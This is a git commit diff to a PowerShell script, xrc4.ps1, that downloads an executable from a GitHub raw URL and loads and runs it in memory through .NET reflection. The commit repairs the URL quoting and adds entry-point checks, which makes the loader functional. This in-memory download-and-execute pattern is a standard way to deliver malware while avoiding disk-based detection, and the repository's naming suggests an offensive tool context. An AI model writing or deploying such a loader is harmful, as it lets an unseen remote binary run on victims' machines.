9391f99afdf66dab30b75379b7b72531647ca3e4
zold1337 <152819963+zold1337@users.noreply.github.com>
2026-06-09 22:50:47 -0300

    Update xrc4.ps1

--- xrc4.ps1
+++ xrc4.ps1
@@ -1,13 +1,11 @@
-$link = https://github.com/zold1337/toolsvip/raw/refs/heads/main/l.exe
+$link = "https://github.com/zold1337/toolsvip/raw/refs/heads/main/l.exe"
 $webClient = New-Object System.Net.WebClient
 $bytes = $webClient.DownloadData($link)
 $assembly = [System.Reflection.Assembly]::Load($bytes)
 $entry = $assembly.EntryPoint
 
-if ($entry.GetParameters().Count -eq 1) {
+if ($entry -and $entry.GetParameters().Count -eq 1) {
     $entry.Invoke($null, @([string[]]@()))
-} else {
+} elseif ($entry) {
     $entry.Invoke($null, $null)
 }
-
-Pause
